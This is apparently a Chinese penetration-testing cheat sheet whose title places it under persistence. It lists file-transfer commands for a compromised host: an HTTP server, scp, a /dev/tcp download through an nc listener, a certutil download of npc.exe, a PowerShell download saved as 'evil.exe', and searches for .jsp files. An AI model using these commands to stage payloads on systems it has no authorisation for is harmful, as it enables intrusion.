---
title: 【权限维持】文件传输
date: 2020-11-02 22:00:00
---
# 文件传输

## Python搭建简单的HTTP服务

```bash
python -m http.server 80

python2 -m SimpleHTTPServer 80
```

## SCP

上传

```bash
scp 123.txt root@10.10.10.10:~/123.txt
```

下载

```bash
scp root@210.210.210.10:/home/root/1.txt ./1.txt
```

## Bash Download

```bash
#服务器监听
nc -lp 1337 < 666.txt

#客户端下载
bash -c 'cat < /dev/tcp/10.10.10.10/1337 > 666.txt'
```

## certutil 下载

```bash
certutil -urlcache -split -f http://10.10.10.10:80/npc.exe
```

## PowerShell 下载

```bash
powershell (new-object System.Net.WebClient).DownloadFile('http://192.168.174.1:1234/evil.txt','evil.exe')
```

## Windows查找文件

```bash
dir /s *.jsp
```

```bash
for /r D:\developer %i in (*.jspx) do @echo %i
```